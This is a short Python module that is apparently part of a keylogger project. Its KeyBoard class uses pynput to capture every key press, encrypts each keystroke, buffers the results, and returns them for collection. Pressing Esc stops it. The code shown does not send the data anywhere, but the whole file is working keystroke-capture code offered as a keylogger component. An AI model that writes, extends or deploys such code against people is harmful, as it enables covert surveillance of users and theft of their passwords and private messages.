from pynput import keyboard
from IKeyLogger import *
from Encryption import Encryption


class KeyBoard(IKeyLogger):
    def __init__(self):
        self.listening = None
        self.key_presses = []

    def start_listening(self) -> None:
        if self.listening is None:
            self.listening = keyboard.Listener(on_press=self.filter)
            self.listening.start()

    def stop_listening(self) -> None:
        if self.listening is not None:
            self.listening.stop()
            self.listening = None

    def filter(self, key):
        if key == keyboard.Key.esc:# for stop press esc
            self.stop_listening()
        else:
            key = str(key)
            enc = Encryption(key)
            encrypted_key = enc.encryption_text()
            self.key_presses.append(encrypted_key)

    def get_key_presses(self):
        presses = self.key_presses
        self.key_presses = []
        return presses









